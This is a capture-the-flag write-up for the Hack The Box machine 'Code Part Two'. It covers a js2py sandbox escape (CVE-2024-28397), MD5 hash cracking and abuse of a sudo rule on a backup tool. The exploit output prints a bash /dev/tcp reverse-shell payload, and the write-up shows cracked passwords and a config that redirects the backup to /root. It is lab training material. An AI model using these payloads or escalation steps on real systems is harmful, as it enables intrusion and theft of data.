# HTB Writeup: Code Part Two

> Machine Information
>
> Name: Codeparttwo
> 
> IP: 10.129.7.231
> 
> Domain: codepart2.htb
> 
> OS: Linux (Debian GNU/Linux)
>
> Difficulty: Easy

## Summary

Code Part Two involves enumerating a Python web application running on port 8000,
discovering a vulnerable dependency (js2py <= 0.74), exploiting CVE-2024-28397 to
gain a reverse shell, cracking MD5 password hashes from a local database to pivot
to a user account, and abusing a misconfigured sudo permission on a backup utility
to read the root flag.

**Attack Chain:** CVE Exploitation → Hash Cracking → Sudo Abuse

## Enumeration

### Nmap
```bash
┌─[netcur10s@parrot]─[~]
└──╼ $nmap -sC -sV 10.129.7.231
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-21 20:04 EST
Nmap scan report for codepart2.htb (10.129.7.231)
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```

Results showed two open ports:
- **22/tcp** — OpenSSH 8.2p1
- **8000/tcp** — Gunicorn 20.0.4 (Python web app)

### Web Application (Port 8000)
<img width="1404" height="650" alt="image" src="https://github.com/user-attachments/assets/344201cf-eb53-4468-9840-a3af59af4146" />

Navigated to the web app and found a "Download App" option on the landing page.
Downloaded the source code as a zip archive and extracted the file listing:
```bash
┌─[netcur10s@parrot]─[~/htb/blue/codepart2]
└──╼ $unzip -l app.zip 
Archive:  app.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2025-09-01 09:33   app/
        0  2024-10-26 13:57   app/static/
        0  2025-01-16 23:54   app/static/css/
     4014  2025-01-16 23:46   app/static/css/styles.css
        0  2025-01-16 23:30   app/static/js/
     3309  2024-10-26 13:57   app/static/js/script.js
     3679  2025-09-01 09:33   app/app.py
        0  2025-09-01 09:32   app/templates/
     2069  2025-09-01 09:32   app/templates/dashboard.html
     4469  2025-09-01 09:32   app/templates/reviews.html
     2554  2025-09-01 09:32   app/templates/index.html
     1157  2025-09-01 09:32   app/templates/base.html
      696  2025-09-01 09:32   app/templates/register.html
      728  2025-09-01 09:32   app/templates/login.html
       49  2025-01-16 23:36   app/requirements.txt
        0  2025-01-16 23:50   app/instance/
    16384  2025-01-16 23:50   app/instance/users.db
---------                     -------
    39108                     17 files
```

Key files of interest:
- `app/app.py` — main application logic
- `app/requirements.txt` — dependency list
- `app/instance/users.db` — SQLite database

Attempted to access the database directly but found it empty at this stage.

Reviewed `requirements.txt` and identified **js2py 0.74** as a dependency.
Researching this version revealed **CVE-2024-28397** — a sandbox escape vulnerability
affecting js2py <= 0.74.

## Initial Access

### CVE-2024-28397 — js2py Sandbox Escape

Located a public proof-of-concept exploit targeting the `run_code` endpoint.

Set up a netcat listener:
```bash
nc -lvnp 4444
```

Ran the exploit:
```bash
┌─[netcur10s@parrot]─[~/htb/blue/codepart2]
└──╼ $python3 exploit.py --target http://codepart2.htb:8000/run_code --lhost 10.10.14.146
============================================================
CVE-2024-28397 - js2py Sandbox Escape Exploit
Targets js2py <= 0.74
============================================================

[*] Generating exploit payload...
[+] Target URL: http://codepart2.htb:8000/run_code
[+] Reverse shell: (bash >& /dev/tcp/10.10.14.146/4444 0>&1) &
[+] Base64 encoded: KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ2LzQ0NDQgMD4mMSkgJg==
[+] Listening address: 10.10.14.146:4444

[!] Start your listener: nc -lnvp 4444

[*] Press Enter when your listener is ready...
[*] Sending exploit payload...
[+] Payload sent successfully!
[+] Response: {"error":"'NoneType' object is not callable"}

[+] Check your netcat listener for the reverse shell!
```

Successfully received a reverse shell as user `app`.
```
┌─[netcur10s@parrot]─[~/htb/blue/codepart2]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.12.31 36470
whoami
app
```

## Lateral Movement

### Hash Cracking

Located the SQLite database in the `instance/` directory and extracted user records,
which contained MD5 password hashes:
```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|admin|098f6bcd4621d373cade4e832627b4f6
```

Cracked the hashes using hashcat with the rockyou wordlist:
```bash
┌─[✗]─[netcur10s@parrot]─[~/htb/blue/codepart2]
└──╼ $hashcat -a 0 -m 0 --username --separator '|' hash.txt /usr/share/wordlists/rockyou.txt  --show
marco|649c9d65a206a75f5abe509fe128bce5|sweetangelbabylove
admin|098f6bcd4621d373cade4e832627b4f6|test
```

Results:
- `marco` → **sweetangelbabylove**
- `admin` → **test** (this was the account I had registered — confirmed not useful)

SSHed into the box using the marco credentials:
```bash
┌─[netcur10s@parrot]─[~/htb/blue/codepart2]
└──╼ $ssh marco@codepart2.htb
Last login: Wed Jan 28 02:58:16 2026 from 10.10.14.146
```

Retrieved the user flag:
```
┌─[netcur10s@parrot]─[~/htb/blue/codepart2]
└──╼ $ssh marco@codepart2.htb
Last login: Wed Jan 28 02:58:16 2026 from 10.10.14.146
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cat user.txt 
```
You'll have to pwn the box to find this!

## Privilege Escalation

### Sudo Abuse — npbackup-cli

Checked sudo permissions:
```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Marco was permitted to run `/usr/local/bin/npbackup-cli` as root with no password.

Copied the existing backup config file and modified the `paths` value to target `/root`:
```yaml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PD>
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
```

Ran the backup to force the tool to read the `/root` directory as root:
```bash
marco@codeparttwo:~$ sudo npbackup-cli -c test.conf -b -f
2026-01-28 21:01:50,273 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-28 21:01:50,293 :: INFO :: Loaded config E1057128 in /home/marco/test.conf
2026-01-28 21:01:50,301 :: INFO :: Running backup of ['/root'] to repo default
2026-01-28 21:01:51,476 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2026-01-28 21:01:51,476 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2026-01-28 21:01:51,476 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2026-01-28 21:01:51,476 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2026-01-28 21:01:51,476 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2026-01-28 21:01:51,476 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2026-01-28 21:01:51,476 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2026-01-28 21:01:51,477 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2026-01-28 21:01:51,477 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.888 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 28c77d82 saved
2026-01-28 21:01:52,415 :: INFO :: Backend finished with success
2026-01-28 21:01:52,416 :: INFO :: Processed 197.7 KiB of data
2026-01-28 21:01:52,416 :: ERROR :: Backup is smaller than configured minmium backup size
2026-01-28 21:01:52,417 :: ERROR :: Operation finished with failure
2026-01-28 21:01:52,417 :: INFO :: Runner took 2.11664 seconds for backup
2026-01-28 21:01:52,417 :: INFO :: Operation finished
2026-01-28 21:01:52,422 :: INFO :: ExecTime = 0:00:02.151555, finished, state is: errors.
```

Then used the `--dump` flag to read the root flag directly:
```bash
sudo /usr/local/bin/npbackup-cli -c test.conf --dump /root/root.txt
```

Retrieved the root flag:
You'll have to pwn the box to find this!

## Key Takeaways

- Always review application dependencies for known CVEs — outdated packages are
  a common and easily exploitable attack vector.
- MD5 is a weak hashing algorithm. Passwords stored as unsalted MD5 hashes are
  trivially crackable with common wordlists.
- Overly permissive sudo rules on backup utilities can allow full filesystem access,
  even without a shell as root.

## Tools Used

- Nmap
- Hashcat
- Netcat
- CVE-2024-28397 PoC

## References

- [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)
- [js2py GitHub](https://github.com/PiotrDabkowski/Js2Py)
- [MITRE ATT&CK - Exploit Public-Facing Application T1190](https://attack.mitre.org/techniques/T1190/)
